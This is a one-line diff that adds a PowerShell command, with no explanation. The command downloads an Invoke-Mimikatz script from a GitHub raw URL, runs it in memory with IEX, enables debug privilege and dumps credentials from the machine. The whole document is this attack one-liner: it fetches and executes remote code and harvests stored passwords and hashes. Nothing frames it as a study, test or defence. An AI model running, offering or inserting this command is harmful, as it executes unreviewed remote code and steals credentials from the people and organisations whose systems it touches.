@@ -1,0 +1,1 @@
+IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/frkngksl/FixedInvokeMimikatz/main/invokeMimi.ps1"); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds;
